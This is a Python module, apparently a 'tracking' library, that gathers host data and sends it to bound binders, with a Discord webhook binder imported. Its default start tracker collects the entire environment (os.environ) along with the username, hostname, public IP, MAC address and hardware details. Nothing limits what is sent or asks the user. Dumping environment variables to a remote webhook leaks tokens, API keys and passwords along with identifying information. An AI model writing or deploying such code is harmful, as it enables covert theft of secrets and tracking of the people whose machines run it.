from scopes import TrackingScope
from requests import get
import os
import platform
import sys
import subprocess
import psutil
import uuid
import re
import atexit
from discord_webhook_binder import DiscordWebhookBinder

_binders = []

_trackers = {
    'start': ["env", "os_name", "os_version", "os_arch", "os_release", "os_dist", "os_dist_version", "username", "hostname", "ip", "mac", "cpu", "gpu", "gpu_count", "ram", "ram_used", "disk_used", "disk_max"],
    'stop': []
}

def add_tracker(name, scopes):
    _trackers[name] = scopes

def _execute_tracker(scopes):
    binder_scopes = []
    for scope in scopes:
        binder_scopes.append({
            "name": str(scope),
            "value": str(_get_scope_value(scope))
        })
    _message_binders(binder_scopes)

def _get_scope_value(scope):
    if scope == 'env' or scope == TrackingScope.ENV:
        return os.environ
    elif scope == 'os_name' or scope == TrackingScope.OS_NAME:
        return platform.system()
    elif scope == 'os_version' or scope == TrackingScope.OS_VERSION:
        return platform.version()
    elif scope == 'os_arch' or scope == TrackingScope.OS_ARCH:
        return platform.machine()
    elif scope == 'os_release' or scope == TrackingScope.OS_RELEASE:
        return platform.release()
    elif scope == 'os_dist' or scope == TrackingScope.OS_DIST:
        return platform.version()
    elif scope == 'os_dist_version' or scope == TrackingScope.OS_DIST_VERSION:
        return platform.release()
    elif scope == 'username' or scope == TrackingScope.USERNAME:
        return os.getlogin()
    elif scope == 'hostname' or scope == TrackingScope.HOSTNAME:
        return platform.node()
    elif scope == 'ip' or scope == TrackingScope.IP:
        return get('https://api.ipify.org').content.decode('utf8')
    elif scope == 'mac' or scope == TrackingScope.MAC:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    elif scope == 'cpu' or scope == TrackingScope.CPU:
        return str(platform.processor())
    elif scope == 'gpu' or scope == TrackingScope.GPU:
        return subprocess.check_output(["nvidia-smi", "-L"]).decode('utf8')
    elif scope == 'gpu_count' or scope == TrackingScope.GPU_COUNT:
        return len(subprocess.check_output(["nvidia-smi", "-L"]).decode('utf8').split(' ')) - 1
    elif scope == 'ram' or scope == TrackingScope.RAM:
        return str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB"
    elif scope == 'ram_used' or scope == TrackingScope.RAM_USED:
        return str(round(psutil.virtual_memory().used / (1024.0 **3))) + " GB"
    elif scope == 'disk_used' or scope == TrackingScope.DISK_USED:
        return str(round(psutil.disk_usage('/').used / (1024.0 **3))) + " GB"
    elif scope == 'disk_max' or scope == TrackingScope.DISK_MAX:
        return str(round(psutil.disk_usage('/').total / (1024.0 **3))) + " GB"
    else:
        return "Unknown scope"

def _message_binders(scopes):
    for binder in _binders:
        binder.send(scopes)

def bind(binder):
    _binders.append(binder)

def track(name):
    _execute_tracker(_trackers[name])

def start():
    _execute_tracker(_trackers['start'])

def stop():
    _execute_tracker(_trackers['stop'])

if __name__ == '__main__':
    atexit.register(stop)
    start()